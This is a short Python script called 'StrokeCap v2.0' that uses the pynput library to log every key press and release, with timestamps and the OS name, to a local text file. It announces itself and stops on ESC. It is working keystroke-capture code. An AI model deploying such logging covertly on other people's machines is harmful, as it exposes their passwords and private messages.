from pynput import keyboard
from datetime import datetime
import platform

print("StrokeCap v2.0 is active and logging. Press ESC to stop.")

os_name = platform.system()
platform_info = f"StrokeCap v2.0 logging started on: {os_name}"
with open("stroke_cap_log.txt", "a") as f:
    f.write(platform_info + "\n")
print(platform_info)

def format_key(key):
    if isinstance(key, keyboard.Key):
        return f"[{key.name.upper()}]"
    try:
        return f"'{key.char}'"
    except AttributeError:
        return f"[UNKNOWN:{key}]"

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
    formatted_key = format_key(key)
    log_entry = f"[PRESS] {timestamp} - {formatted_key}\n"
    with open("stroke_cap_log.txt", "a") as f:
        f.write(log_entry)

def on_release(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
    formatted_key = format_key(key)
    log_entry = f"[RELEASE] {timestamp} - {formatted_key}\n"
    with open("stroke_cap_log.txt", "a") as f:
        f.write(log_entry)
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

print("StrokeCap v2.0 has stopped logging.")
